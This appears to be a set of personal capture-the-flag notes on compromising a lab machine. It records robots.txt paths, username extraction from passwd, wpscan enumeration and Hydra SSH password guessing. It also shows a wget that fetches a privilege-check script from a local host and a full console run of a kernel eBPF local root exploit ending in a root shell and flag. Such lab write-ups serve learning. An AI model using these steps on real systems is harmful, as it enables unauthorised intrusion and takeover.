Ribit hole:
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/

Cut passwd to users.txt:
```shell
cat passwd | grep 'bin/bash' | cut -d: -f1
```
Provided:
wpscan --url https://192.168.139.144:12380/blogblog -e u[1-100] -e ap -e at

Actual:
```shell
wpscan --url https://192.168.139.144:12380/blogblog -e u[1-100] --disable-tls-checks

wpscan --url https://192.168.139.144:12380/blogblog --username elly --disable-tls-checks
```
Hydra use try null/username/reverse as password guessing:
```shell
hydra -L users.txt -e nsr 192.168.139.144 ssh

wget http://192.168.139.129/linuxprivchecker.py

lsb_release -a
```  

```shell
SHayslett@red:~/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh 
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
SHayslett@red:~/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput 
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:~/39772/ebpf_mapfd_doubleput_exploit# id
uid=0(root) gid=0(root) groups=0(root),1005(SHayslett)
root@red:~/39772/ebpf_mapfd_doubleput_exploit# whoami
root
root@red:~/39772/ebpf_mapfd_doubleput_exploit# cd /root
root@red:/root# ls
fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
root@red:/root# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```
